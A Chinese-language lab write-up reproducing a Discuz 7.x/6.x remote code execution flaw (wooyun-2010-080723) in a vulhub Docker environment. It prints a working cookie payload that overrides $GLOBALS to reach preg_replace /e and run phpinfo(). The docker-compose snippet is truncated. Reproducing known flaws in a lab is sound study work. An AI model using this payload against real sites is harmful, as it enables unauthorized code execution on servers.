## 1\. 漏洞说明

wooyun-2010-080723：影响版本为 Discuz 7.x/6.x，是一个全局变量防御绕过导致代码执行

由于 php5.3.x 版本里 php.ini 的设置里 request\_order 默认值为 GP，导致 `$REQUEST` 中不再包含 `$COOKIE`，我们通过在 Cookie 中传入 `$GLOBALS` 来覆盖全局变量，造成代码执行漏洞。

具体原理请参考：https://www.secpulse.com/archives/2338.html

## 2\. 漏洞环境

去 vulhub 上下载环境，https://github.com/vulhub/vulhub/tree/master/discuz/wooyun-2010-080723

或者将如下代码保存为 docker-compose.yml

```
version: '2'

"8080:80"


```

执行如下命令启动 Discuz 7.2：

```

docker-compose up -d
```

## 3\. 环境搭建

启动后不要直接访问 http://your-ip:8080/ 否则会出现下面的情况提示数据库连接失败

![](../Images/77506bbc7deaf4a327fed36e127512ac.png)

应该访问 http://your-ip:8080/install/ 来安装 discuz

![](../Images/6ebdf6920bae22fb7555c88dec9585ac.png)

数据库地址填写 db，数据库名为 discuz，数据库账号密码均为 root。

![](../Images/8e5138274935a869a2c402343f0e53f1.png)

然后再次访问 http://192.168.187.131:8080/ 就可以看到网页了，左下角显示是 DZ 7.2 版本

![](../Images/11cb51af027e77c5f35d087eb1d3ae66.png)

## 4\. 漏洞复现

安装成功后，直接找默认版块中一个已存在的帖子，拦截数据包数据包，并在 Cookie 中增加 `GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();`

![](../Images/63873d379cf9713b273a3d8560744401.png)

```


GET /viewthread.php?tid=13&extra=page%3D1 HTTP/1.1
```

如下图所示，phpinfo() 已成功执行

![](../Images/689dc2aea405ebe813bbdd1f96ff1965.png)![](../Images/121a6d493b6c606b9f106b1075711074.png)
